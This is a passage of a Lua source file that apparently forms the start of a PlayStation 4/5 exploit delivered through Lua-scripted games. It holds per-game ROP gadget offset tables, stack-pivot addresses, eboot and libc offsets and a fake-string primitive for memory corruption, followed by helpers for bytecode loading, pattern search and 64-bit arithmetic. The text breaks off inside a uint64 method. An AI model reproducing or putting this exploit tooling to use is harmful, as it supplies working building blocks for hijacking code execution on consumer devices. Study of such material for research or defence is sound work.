
PLATFORM = "ps4"  -- ps4 or ps5
FW_VERSION = nil

options = {
    log_to_klog = true,
    enable_signal_handler = true,
    enable_native_handler = true,
}

if not options.log_to_klog then
    WRITABLE_PATH = "/av_contents/content_tmp/"
    LOG_FILE = WRITABLE_PATH .. "log.txt"
    log_fd = io.open(LOG_FILE, "w")
end

game_name = nil
eboot_base = nil
libc_base = nil
libkernel_base = nil
native_invoke = nil

native_cmd = {
    read_buffer = 0,
    write_buffer = 1,
    fcall = 2,
}

games_identification = {
    [0xbb0] = "RaspberryCube",
    [0xb90] = "Aibeya",
    [0x420] = "HamidashiCreative",
    [0x5d0] = "AikagiKimiIsshoniPack",
    [0x280] = "C",
    [0x600] = "E",
    [0xd80] = "F",
}

gadget_table = {
    raspberry_cube = {
        gadgets = {
            ["ret"] = 0xd2811,

            ["pop rsp; ret"] = 0xa12,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0xa02,
            ["pop rbx; ret"] = 0x5dce6,
            ["pop rcx; ret"] = 0x147cf,
            ["pop rdx; ret"] = 0x53762,
            ["pop rdi; ret"] = 0x467c69,
            ["pop rsi; ret"] = 0xd2810,
            ["pop r8; ret"] = 0xa01,
            ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,
            
            ["mov [rax + 8], rcx; ret"] = 0x135aea,
            ["mov [rax + 0x28], rdx; ret"] = 0x148b9f,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xd0bbe,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x116792,
            ["add rax, r8; ret"] = 0xa893,

            ["mov [rdi], rsi; ret"] = 0xd0d7f,
            ["mov [rdi], rax; ret"] = 0x9522b,
            ["mov [rdi], eax; ret"] = 0x9522c,
            ["add [rbx], eax; ret"] = 0x4091a3,
            ["add [rbx], ecx; ret"] = nil,
            ["mov rax, [rax]; ret"] = 0x1fd5b,
            ["inc dword [rax]; ret"] = 0x1a12eb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x2dcc59,
            ["cmp [rax], eax; ret"] = nil,
            ["sete al; ret"] = 0x538c7,
            ["setne al; ret"] = 0x556,
            ["seta al; ret"] = 0x166fce,
            ["setb al; ret"] = 0x5dd64,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xcb0da,
            ["shl rax, cl; ret"] = 0xd5611,
            ["add rax, rcx; ret"] = 0x354be,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x3963d4, -- crash handler
                ["mov esp, 0xf00000b9; ret"] = 0x39c11c, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1a7bb0, -- to resolve eboot base
            longjmp_import = 0x619388, -- to resolve libc base

            luaL_optinteger = 0x1a5590,
            luaL_checklstring = 0x1a5180,
            lua_pushlstring = 0x1a3280,
            lua_pushinteger = 0x1a3260,
        },
        libc_addrofs = {
            calloc = 0x58a50,
            memcpy = 0x4e9d0,
            setjmp = 0xb6860,
            longjmp = 0xb68b0,
            strerror = 0x42e40,
            error = 0x178,
            sceKernelGetModuleInfoFromAddr = 0x1a8,
            gettimeofday_import = 0x11c010, -- syscall wrapper
        }
    },
    aibeya = {
        gadgets = {    
            ["ret"] = 0x4c,

            ["pop rsp; ret"] = 0xa02,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0x9f2,
            ["pop rbx; ret"] = 0x60876,
            ["pop rcx; ret"] = 0x14a7f,
            ["pop rdx; ret"] = 0x3f3647,
            ["pop rdi; ret"] = 0x1081c0,
            ["pop rsi; ret"] = 0x10ef32,
            ["pop r8; ret"] = 0x9f1,
            ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,
            
            ["mov [rax + 8], rcx; ret"] = 0x13c4fa,
            ["mov [rax + 0x28], rdx; ret"] = 0x14f43f,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xd753e,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11d452,
            ["add rax, r8; ret"] = 0xa7a3,

            ["mov [rdi], rsi; ret"] = 0xd76ff,
            ["mov [rdi], rax; ret"] = 0x994cb,
            ["mov [rdi], eax; ret"] = 0x994cc,
            ["add [rbx], eax; ret"] = nil,
            ["add [rbx], ecx; ret"] = 0x44093b,
            ["mov rax, [rax]; ret"] = 0x2008b,
            ["inc dword [rax]; ret"] = 0x1a82cb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x303609,
            ["cmp [rax], eax; ret"] = 0x44ef72,
            ["sete al; ret"] = 0x55747,
            ["setne al; ret"] = 0x50f,
            ["seta al; ret"] = 0x16dbce,
            ["setb al; ret"] = 0x608f4,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xd1a6a,
            ["shl rax, cl; ret"] = 0xdbf31,
            ["add rax, rcx; ret"] = 0x35afe,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x3bca94, -- crash handler
                -- ["mov esp, 0xde0003b0; ret"] = 0x43f753, -- native handler
                ["mov esp, 0xf00000b9; ret"] = 0x3c27dc, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1aeb90, -- to resolve eboot base
            longjmp_import = 0x6193e8, -- to resolve libc base

            luaL_optinteger = 0x1ac580,
            luaL_checklstring = 0x1ac170,
            lua_pushlstring = 0x1aa260,
            lua_pushinteger = 0x1aa240,
        },
        libc_addrofs = {
            calloc = 0x57e00,
            memcpy = 0x4df50,
            setjmp = 0xb5630,
            longjmp = 0xb5680,
            strerror = 0x42540,
            error = 0x168,
            sceKernelGetModuleInfoFromAddr = 0x198,
            gettimeofday_import = 0x204060, -- syscall wrapper
        }
    },
    hamidashi_creative = {
        gadgets = {    
            ["ret"] = 0x42,

            ["pop rsp; ret"] = 0x9a2,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0x992,
            ["pop rbx; ret"] = 0x5b6e8,
            ["pop rcx; ret"] = 0xe64,
            ["pop rdx; ret"] = 0x3b02d7,
            ["pop rdi; ret"] = 0xc9dfe,
            ["pop rsi; ret"] = 0xd77d,
            ["pop r8; ret"] = 0x991,
            ["mov r9, rbx; call [rax + 8]"] = nil,
            ["pop r13 ; pop r14 ; pop r15 ; ret"] = 0x141fc7,
            ["mov r9, r13; call [rax + 8]"] = 0x136970,
            
            ["mov [rax + 8], rcx; ret"] = 0x1368da,
            ["mov [rax + 0x28], rdx; ret"] = 0x14967f,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xd30ae,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x117882,
            ["add rax, r8; ret"] = 0x9de0,

            ["mov [rdi], rsi; ret"] = 0xd326f,
            ["mov [rdi], rax; ret"] = 0x92c67,
            ["mov [rdi], eax; ret"] = 0x92c68,
            ["add [rbx], eax; ret"] = nil,
            ["add [rbx], ecx; ret"] = nil,
            ["add [rbx], edi; ret"] = 0x3c95f3,
            ["mov rax, [rax]; ret"] = 0x1eebb,
            ["inc dword [rax]; ret"] = 0x1a0acb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = nil,
            ["cmp [rax], ebx; ret"] = 0x3cbb08,
            ["sete al; ret"] = 0x51367,
            ["setne al; ret"] = 0x4bf,
            ["seta al; ret"] = 0x16742e,
            ["setb al; ret"] = 0x5b763,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xcd74a,
            ["shl rax, cl; ret"] = 0xd7885,
            ["add rax, rcx; ret"] = 0x347ae,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x3798f4, -- crash handler
                ["mov esp, 0xf00000b9; ret"] = 0x37f63c, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1a7420, -- to resolve eboot base
            longjmp_import = 0x6168c0, -- to resolve libc base

            luaL_optinteger = 0x1a4d80,
            luaL_checklstring = 0x1a4970,
            lua_pushlstring = 0x1a2a50,
            lua_pushinteger = 0x1a2a30,
        },
        libc_addrofs = {
            calloc = 0x4cdb0,
            memcpy = 0x42410,
            setjmp = 0xb0020,
            longjmp = 0xb0070,
            strerror = 0x366e0,
            error = 0x168,
            sceKernelGetModuleInfoFromAddr = 0x198,
            gettimeofday_import = 0x1179a8, -- syscall wrapper
        }
    },
    aikagi_kimi_isshoni_pack = {
        gadgets = {    
            ["ret"] = 0x4c,

            ["pop rsp; ret"] = 0xa12,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0xa02,
            ["pop rbx; ret"] = 0x5d726,
            ["pop rcx; ret"] = 0x147cf,
            ["pop rdx; ret"] = 0x3cb8b7,
            ["pop rdi; ret"] = 0x51c7d,
            ["pop rsi; ret"] = 0xd2230,
            ["pop r8; ret"] = 0xa01,
            ["mov r9, rbx; call [rax + 8]"] = 0x14a3c0,
            
            ["mov [rax + 8], rcx; ret"] = 0x13550a,
            ["mov [rax + 0x28], rdx; ret"] = 0x1485bf,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xd05de,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x1161b2,
            ["add rax, r8; ret"] = 0xa893,

            ["mov [rdi], rsi; ret"] = 0xd079f,
            ["mov [rdi], rax; ret"] = 0x94c4b,
            ["mov [rdi], eax; ret"] = 0x94c4c,
            ["add [rbx], eax; ret"] = 0x407a23,
            ["add [rbx], ecx; ret"] = nil,
            ["add [rbx], edi; ret"] = 0x3e4a43,
            ["mov rax, [rax]; ret"] = 0x1fd5b,
            ["inc dword [rax]; ret"] = 0x1a0d0b,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x2db4d9,
            ["cmp [rax], ebx; ret"] = nil,
            ["sete al; ret"] = 0x53307,
            ["setne al; ret"] = 0x556,
            ["seta al; ret"] = 0x1669ee,
            ["setb al; ret"] = 0x5d7a4,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xcaafa,
            ["shl rax, cl; ret"] = 0xd5031,
            ["add rax, rcx; ret"] = 0x34efe,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x394c54, -- crash handler
                ["mov esp, 0xf00000b9; ret"] = 0x39a99c, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1a75d0, -- to resolve eboot base
            longjmp_import = 0x619388, -- to resolve libc base

            luaL_optinteger = 0x1a4fb0,
            luaL_checklstring = 0x1a4ba0,
            lua_pushlstring = 0x1a2ca0,
            lua_pushinteger = 0x1a2c80,
        },
        libc_addrofs = {
            calloc = 0x58a50,
            memcpy = 0x4e9d0,
            setjmp = 0xb6860,
            longjmp = 0xb68b0,
            strerror = 0x42e40,
            error = 0x178,
            sceKernelGetModuleInfoFromAddr = 0x1a8,
            gettimeofday_import = 0x11c010, -- syscall wrapper
        }
    },
    -- not supporting new mov r9, consider dropping
    c = {
        gadgets = {    
            ["ret"] = 0x4c,

            ["pop rsp; ret"] = 0x972,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0x962,
            ["pop rbx; ret"] = 0x3f311,
            ["pop rcx; ret"] = 0xc35,
            ["pop rdx; ret"] = 0x3066e2,
            ["pop rdi; ret"] = 0x107550,
            ["pop rsi; ret"] = 0xfcd16,
            ["pop r8; ret"] = 0x961,
            ["mov r9, rbx; call [rax + 8]"] = 0x145f20,
            
            ["mov [rax + 8], rcx; ret"] = 0x12c5ff,
            ["mov [rax + 0x28], rdx; ret"] = 0x14439f,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xcbc3e,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = nil,
            ["add rax, r8; ret"] = 0x116d16,

            ["mov [rdi], rsi; ret"] = 0xcbe0f,
            ["mov [rdi], rax; ret"] = 0xa16b,
            ["mov [rdi], eax; ret"] = 0xa16c,
            ["add [rbx], eax; ret"] = 0x405d0b,
            ["add [rbx], ecx; ret"] = nil,
            ["add [rbx], edi; ret"] = 0x3e2e53,
            ["mov rax, [rax]; ret"] = 0x1e55b,
            ["inc dword [rax]; ret"] = 0x18ecbb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x2d2d79,
            ["cmp [rax], ebx; ret"] = nil,
            ["sete al; ret"] = 0x55bc5,
            ["setne al; ret"] = 0x1c58e,
            ["seta al; ret"] = 0x16187e,
            ["setb al; ret"] = 0x55be4,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xc600a,
            ["shl rax, cl; ret"] = 0xd0623,
            ["add rax, rcx; ret"] = 0x102341,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x3925e4, -- crash handler
                ["mov esp, 0xf00000b9; ret"] = 0x39832c, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x195280, -- to resolve eboot base
            longjmp_import = 0x4caf88, -- to resolve libc base

            luaL_optinteger = 0x192cc0,
            luaL_checklstring = 0x1928b0,
            lua_pushlstring = 0x190a20,
            lua_pushinteger = 0x190a00,
        },
        libc_addrofs = {
            calloc = 0x5e2e0,
            memcpy = 0x54a60,
            setjmp = 0x74ad0,
            longjmp = 0x71b20,
            strerror = 0x49020,
            error = 0x148,
            sceKernelGetModuleInfoFromAddr = 0x548,
            gettimeofday_import = 0xdbd60, -- syscall wrapper
        }
    },
    e = {
        gadgets = {    
            ["ret"] = 0x4c,
            
            ["pop rsp; ret"] = 0x932,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0x922,
            ["pop rbx; ret"] = 0xd16f5,
            ["pop rcx; ret"] = 0xc15,
            ["pop rdx; ret"] = 0x194902,
            ["pop rdi; ret"] = 0xd74c2,
            ["pop rsi; ret"] = 0xe4b04,
            ["pop r8; ret"] = 0x921,
            ["mov r9, rbx; call [rax + 8]"] = 0x14f760,
            
            ["mov [rax + 8], rcx; ret"] = 0x13b120,
            ["mov [rax + 0x28], rdx; ret"] = 0x14d97f,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xd575e,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11c2c2,
            ["add rax, r8; ret"] = 0x125b56,

            ["mov [rdi], rsi; ret"] = 0xd592f,
            ["mov [rdi], rax; ret"] = 0xa42b,
            ["mov [rdi], eax; ret"] = 0xa42c,
            ["add [rbx], eax; ret"] = 0x42a0db,
            ["add [rbx], ecx; ret"] = nil,
            ["add [rbx], edi; ret"] = 0x408943,
            ["mov rax, [rax]; ret"] = 0x201cb,
            ["inc dword [rax]; ret"] = 0x198dbb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x2f93a9,
            ["cmp [rax], eax; ret"] = nil,
            ["sete al; ret"] = 0x5e635,
            ["setne al; ret"] = 0x1e39e,
            ["seta al; ret"] = 0x16af0e,
            ["setb al; ret"] = 0x5e654,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xcfc4a,
            ["shl rax, cl; ret"] = 0xda391,
            ["add rax, rcx; ret"] = 0x355ce,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x3b8784, -- crash handler
                ["mov esp, 0xf00000b9; ret"] = 0x3be4cc, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x19f600, -- to resolve eboot base
            longjmp_import = 0x4f3ac0, -- to resolve libc base

            luaL_optinteger = 0x19d010,
            luaL_checklstring = 0x19cc00,
            lua_pushlstring = 0x19ad00,
            lua_pushinteger = 0x19ace0,
        },
        libc_addrofs = {
            calloc = 0x22090,
            memcpy = 0x18590,
            setjmp = 0x7f660,
            longjmp = 0x7f6b0,
            strerror = 0xcda0,
            error = 0x138,
            sceKernelGetModuleInfoFromAddr = 0x568,
            gettimeofday_import = 0xefd10, -- syscall wrapper
        }
    },
    f = {
        gadgets = {    
            ["ret"] = 0x4c,
            
            ["pop rsp; ret"] = 0xa02,
            ["pop rbp; ret"] = 0x79,
            ["pop rax; ret"] = 0x9f2,
            ["pop rbx; ret"] = 0x608b6,
            ["pop rcx; ret"] = 0x14a7f,
            ["pop rdx; ret"] = 0x3f3ce7,
            ["pop rdi; ret"] = 0x899fb,
            ["pop rsi; ret"] = 0x10f122,
            ["pop r8; ret"] = 0x9f1,
            ["mov r9, rbx; call [rax + 8]"] = 0x1513ef,
            
            ["mov [rax + 8], rcx; ret"] = 0x13c6ea,
            ["mov [rax + 0x28], rdx; ret"] = 0x14f62f,
            ["mov [rcx + 0xa0], rdi; ret"] = 0xd772e,
            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11d642,
            ["add rax, r8; ret"] = 0xa7a3,

            ["mov [rdi], rsi; ret"] = 0xd78ef,
            ["mov [rdi], rax; ret"] = 0x996bb,
            ["mov [rdi], eax; ret"] = 0x996bc,
            ["add [rbx], eax; ret"] = nil,
            ["add [rbx], ecx; ret"] = 0x44107f,
            ["add [rbx], edi; ret"] = 0x40cde3,
            ["mov rax, [rax]; ret"] = 0x2008b,
            ["inc dword [rax]; ret"] = 0x1a84bb,

            -- branching specific gadgets
            ["cmp [rcx], eax; ret"] = 0x303ca9,
            ["cmp [rax], eax; ret"] = 0x44f6fe,
            ["sete al; ret"] = 0x55787,
            ["setne al; ret"] = 0x50f,
            ["seta al; ret"] = 0x16ddbe,
            ["setb al; ret"] = 0x60934,
            ["setg al; ret"] = nil,
            ["setl al; ret"] = 0xd1c5a,
            ["shl rax, cl; ret"] = 0xdc121,
            ["add rax, rcx; ret"] = 0x35afe,

            stack_pivot = {
                ["mov esp, 0xfb0000bd; ret"] = 0x3bd134, -- crash handler
                ["mov esp, 0xf00000b9; ret"] = 0x3c2e7c, -- native handler
            }
        },
        eboot_addrofs = {
            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
            luaB_auxwrap = 0x1aed80, -- to resolve eboot base
            longjmp_import = 0x6193e8, -- to resolve libc base

            luaL_optinteger = 0x1ac770,
            luaL_checklstring = 0x1ac360,
            lua_pushlstring = 0x1aa450,
            lua_pushinteger = 0x1aa430,
        },
        libc_addrofs = {
            calloc = 0x57e00,
            memcpy = 0x4df0,
            setjmp = 0xb5630,
            longjmp = 0xb5680,
            strerror = 0x42540,
            error = 0x168,
            sceKernelGetModuleInfoFromAddr = 0x198,
            gettimeofday_import = 0x204060, -- syscall wrapper
        }
    },
}


--
-- misc functions
--

function notify(s)
    e:tag{"dialog", title="", message=s}
end

function error(s)
    assert(false, s)
end

function errorf(fmt, ...)
    error(string.format(fmt, ...))
end

function prepare_arguments(...)
    local s = ""
    for i,v in ipairs(arg) do
        s = s .. tostring(v)
        if i < #arg then
            s = s .. "\t"
        end
    end
    return s
end

if not options.log_to_klog then
    function print(...)
        log_fd:write(prepare_arguments(...) .. "\n")
        log_fd:flush()
    end
end

function printf(fmt, ...)
    if options.log_to_klog then
        print(string.format(fmt, ...) .. "\n")
    else
        log_fd:write(string.format(fmt, ...) .. "\n")
        log_fd:flush()
    end
end

function file_write(filename, data, mode)
    local fd = io.open(filename, mode or "wb")
    fd:write(data)
    fd:close()
end

function file_read(filename, mode)
    return io.open(filename, mode):read("*all")
end

function hex_dump(buf, addr)
    addr = addr or 0
    local result = {}
    for i = 1, #buf, 16 do
        local chunk = buf:sub(i, i+15)
        local hexstr = chunk:gsub('.', function(c) 
            return string.format('%02X ', string.byte(c)) 
        end)
        local ascii = chunk:gsub('%c', '.') -- replace non-printable characters
        table.insert(result, string.format('%s  %-48s %s', hex(addr+i-1), hexstr, ascii))
    end
    return table.concat(result, '\n')
end

function hex_to_binary(hex)
    return (hex:gsub('..', function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

function bin_to_hex(str)
    return (str:gsub('.', function(c)
        return string.format('%02x', string.byte(c))
    end))
end

function load_bytecode(data)
    local bc, err = loadstring(hex_to_binary(data:gsub("%s+", "")))
    assert(bc, "error while loading bytecode: " .. tostring(err))
    return bc
end

function run_with_coroutine(f)
    local co = coroutine.create(f)
    local ok, result = coroutine.resume(co)
    if not ok then
        local traceback = debug.traceback(co) .. debug.traceback():sub(17)
        return result .. "\n" .. traceback
    end
end

function run_nogc(f)
    collectgarbage("stop")
    f()
    collectgarbage("restart")
end

function sleep(a) 
    local sec = tonumber(os.clock() + a); 
    while (os.clock() < sec) do 
    end 
end

function dump_table(o, depth, indent)
    depth = depth or 2
    indent = indent or 0
    if depth < 1 then return tostring(o) end
    local function get_indent(level)
        return string.rep("  ", level)
    end
    if type(o) == 'table' then
        local s = '{\n'
        local inner_indent = indent + 1
        for k, v in pairs(o) do
            s = s .. get_indent(inner_indent)
            if type(k) ~= 'number' then
                k = '"' .. k .. '"'
            end
            s = s .. '[' .. k .. '] = ' .. dump_table(v, depth - 1, inner_indent)
            s = s .. ',\n'
        end
        s = s .. get_indent(indent) .. '}'
        return s
    else
        return tostring(o)
    end
end

-- credit: https://github.com/iryont/lua-struct/blob/master/src/struct.lua#L149-L174
function string_to_double(x)
    assert(#x == 8)
    -- x = string.reverse(x)  -- if big endian
    local sign = 1
    local mantissa = string.byte(x, 7) % 16
    for i = 6, 1, -1 do
        mantissa = mantissa * (2 ^ 8) + string.byte(x, i)
    end
    if string.byte(x, 8) > 127 then
        sign = -1
    end
    local exponent = (string.byte(x, 8) % 128) * 16 + math.floor(string.byte(x, 7) / 16)
    if exponent == 0 then
        return 0.0
    else
        mantissa = (math.ldexp(mantissa, -52) + 1) * sign
        return math.ldexp(mantissa, exponent - 1023)
    end
end

function align_to(v,n)
    if is_uint64(v) then
        n = uint64(n)
    end
    return v + (n - v % n) % n
end

function align_16(v)
    return align_to(v, 16)
end

function find_pattern(buffer, pattern)
    local pat = pattern:gsub("%S+", function(b)
        return b == "?" and "." or string.char(tonumber(b, 16))
    end):gsub("%s+", "")
    local matches, start = {}, 1
    while true do
        local s = buffer:find(pat, start)
        if not s then break end
        matches[#matches+1], start = s, s+1
    end
    return matches
end





--
-- bit32 class
--
-- credit: https://github.com/minetest-mods/turtle/blob/master/bit32.lua
--

bit32 = {}

bit32.N = 32
bit32.P = 2 ^ bit32.N

function bit32.bnot(x)
    x = x % bit32.P
    return bit32.P - 1 - x
end

function bit32.band(...)
    local args = {...}
    local result = args[1] or 0
    for i = 2, #args do
        local x, y = result, args[i]
        -- Common usecases, they deserve to be optimized
        if y == 0xff then
            result = x % 0x100
        elseif y == 0xfff then
            result = x % 0x1000
        elseif y == 0xffff then
            result = x % 0x10000
        elseif y == 0xffffffff then
            result = x % 0x100000000
        else
            x, y = x % bit32.P, y % bit32.P
            result = 0
            local p = 1
            for j = 1, bit32.N do
                local a, b = x % 2, y % 2
                x, y = math.floor(x / 2), math.floor(y / 2)
                if a + b == 2 then
                    result = result + p
                end
                p = 2 * p
            end
        end
    end
    return result
end

function bit32.bor(...)
    local args = {...}
    local result = args[1] or 0
    for i = 2, #args do
        local x, y = result, args[i]
        -- Common usecases, they deserve to be optimized
        if y == 0xff then
            result = x - (x%0x100) + 0xff
        elseif y == 0xffff then
            result = x - (x%0x10000) + 0xffff
        elseif y == 0xffffffff then
            result = 0xffffffff
        else
            x, y = x % bit32.P, y % bit32.P
            result = 0
            local p = 1
            for j = 1, bit32.N do
                local a, b = x % 2, y % 2
                x, y = math.floor(x / 2), math.floor(y / 2)
                if a + b >= 1 then
                    result = result + p
                end
                p = 2 * p
            end
        end
    end
    return result
end

function bit32.bxor(...)
    local args = {...}
    local result = args[1] or 0
    for i = 2, #args do
        local x, y = result, args[i]
        x, y = x % bit32.P, y % bit32.P
        result = 0
        local p = 1
        for j = 1, bit32.N do
            local a, b = x%2, y%2
            x, y = math.floor(x/2), math.floor(y/2)
            if a + b == 1 then
                result = result + p
            end
            p = 2 * p
        end
    end
    return result
end

function bit32.lshift(x, s_amount)
    if math.abs(s_amount) >= bit32.N then return 0 end
    x = x % bit32.P
    if s_amount < 0 then
        return math.floor(x * (2 ^ s_amount))
    else
        return (x * (2 ^ s_amount)) % bit32.P
    end
end

function bit32.rshift(x, s_amount)
    if math.abs(s_amount) >= bit32.N then return 0 end
    x = x % bit32.P
    if s_amount > 0 then
        return math.floor(x * (2 ^ - s_amount))
    else
        return (x * (2 ^ -s_amount)) % bit32.P
    end
end

function bit32.arshift(x, s_amount)
    if math.abs(s_amount) >= bit32.N then return 0 end
    x = x % bit32.P
    if s_amount > 0 then
        local add = 0
        if x >= bit32.P/2 then
            add = bit32.P - 2 ^ (bit32.N - s_amount)
        end
        return math.floor(x * (2 ^ -s_amount)) + add
    else
        return (x * (2 ^ -s_amount)) % bit32.P
    end
end






--
-- uint64 class
--
-- constructor accepts:
-- 1) uint64 instance
-- 2) hex value in string ("0xaabb")
-- 3) lua number
--
-- note: from llm and refined over time. might have some bugs
--

uint64 = {}
uint64.__index = uint64

setmetatable(uint64, {
    __call = function(_, v) -- make class callable
        return uint64:new(v)
    end
})

function is_uint64(v) 
    return type(v) == "table" and v.h and v.l and true or false 
end

function ub8(n) 
    return uint64(n):pack() 
end

function hex(v)
    if is_uint64(v) then
        return tostring(v)
    elseif type(v) == "number" then
        return string.format("0x%x", v)
    else
        errorf("hex: unknown type (%s)", type(v))
    end
end

function uint64:new(v)

    local self = setmetatable({}, uint64)

    if is_uint64(v) then
        self.h, self.l = v.h, v.l
    elseif type(v) == "number" then
        self.h, self.l = math.floor(v / 2^32), v % 2^32
    elseif type(v) == "string" then
        if v:sub(1, 2):lower() == "0x" then  -- init from hexstring
            v = v:sub(3):gsub("^0+", ""):upper()
            assert(#v <= 16, string.format("uint64:new: hex string too long for uint64 (%s)", v))
            v = string.rep("0", 16 - #v) .. v  -- pad with leading zeros
            self.h = tonumber(v:sub(1, 8), 16) or 0
            self.l = tonumber(v:sub(9, 16), 16) or 0
        else
            local num = tonumber(v)  -- assume its normal number
            assert(num, string.format("uint64:new: invalid decimal string for uint64 (%s)", v))
            self.h, self.l = math.floor(num / 2^32), num % 2^32
        end
    else
        errorf("uint64:new: invalid type passed to constructor (%s)", type(v))
    end

    return self
end

function uint64:__tostring()
    local hex = string.format("%x%08x", self.h, self.l):gsub("^0+", "")
    return "0x" .. (hex == "" and "0" or hex)
end

function uint64:tonumber()
    if self.h >= 0x80000000 then -- for negative number
        return -(bit32.bnot(self.h) * 2^32 + bit32.bnot(self.l) + 1)
    else
        return self.h * 2^32 + self.l
    end
end

function uint64:pack()
    return string.char(
        self.l % 256,
        bit32.rshift(self.l, 8) % 256,
        bit32.rshift(self.l, 16) % 256,
        bit32.rshift(self.l, 24) % 256,
        self.h % 256,
        bit32.rshift(self.h, 8) % 256,
        bit32.rshift(self.h, 16) % 256,
        bit32.rshift(self.h, 24) % 256
    )
end

function uint64.unpack(str)
    if not (type(str) == "string" and #str == 8 or #str == 4) then
        error("uint64.unpack: input string must be 8 or 4 length size")
    end
    local l = str:byte(1) + bit32.lshift(str:byte(2), 8) 
        + bit32.lshift(str:byte(3), 16) + bit32.lshift(str:byte(4), 24)
    local h = #str == 8 and (str:byte(5) + bit32.lshift(str:byte(6), 8) 
        + bit32.lshift(str:byte(7), 16) + bit32.lshift(str:byte(8), 24)) or 0
    return uint64({h = h, l = l})
end

-- note: comparison ops only work if both are same type

function uint64:__eq(v)
    v = uint64(v)
    return self.h == v.h and self.l == v.l
end

function uint64:__lt(v)
    v = uint64(v)
    return self.h < v.h or (self.h == v.h and self.l < v.l)
end

function uint64:__le(v)
    v = uint64(v)
    return self.h < v.h or (self.h == v.h and self.l <= v.l)
end

function uint64:__add(v)
    v = uint64(v)
    local l = self.l + v.l
    local h = self.h + v.h + (l >= 2^32 and 1 or 0)
    return uint64({h = h % 2^32, l = l % 2^32})
end

function uint64:__sub(v)
    v = uint64(v)
    local l = self.l - v.l
    local h = self.h - v.h - (l < 0 and 1 or 0)
    return uint64({h = (h + 2^32) % 2^32, l = (l + 2^32) % 2^32})
end

function uint64:__mul(v)
    v = uint64(v)
    local ah, al, bh, bl = self.h, self.l, v.h, v.l
    local h = ah * bl + al * bh
    local l = al * bl
    return uint64({h = (h + bit32.rshift(l, 32)) % 2^32, l = l % 2^32})
end

function uint64:divmod(v)
    v = uint64(v)
    if v.h == 0 and v.l == 0 then error("division by zero") end
    local q, r = uint64(0), uint64(0)
    for i = 63, 0, -1 do
        r = r:lshift(1)
        if bit32.rshift(self.h, i % 32) % 2 == 1 or (i < 32 and bit32.rshift(self.l, i) % 2 == 1) then
            r = r + 1
        end
        if r >= v then
            r = r - v
            q = q + uint64(1):lshift(i)
        end
    end
    return q, r
end

function uint64:__div(v) return select(1, self:divmod(v)) end
function uint64:__mod(v) return select(2, self:divmod(v)) end

function uint64:lshift(n)
    if n >= 64 then return uint64(0) end
    if n >= 32 then
        return uint64({h = bit32.lshift(self.l, n - 32), l = 0})
    else
        local h = bit32.bor(bit32.lshift(self.h, n), bit32.rshift(self.l, 32 - n))
        local l = bit32.lshift(self.l, n)
        return uint64({h = h, l = l})
    end
end

function uint64:rshift(n)
    if n >= 64 then return uint64(0) end
    if n >= 32 then
        return uint64({h = 0, l = bit32.rshift(self.h, n - 32)})
    else
        local h = bit32.rshift(self.h, n)
        local l = bit32.bor(bit32.rshift(self.l, n), bit32.lshift(self.h % (2^n), 32 - n))
        return uint64({h = h, l = l})
    end
end

function uint64:bxor(v)
    v = uint64(v)
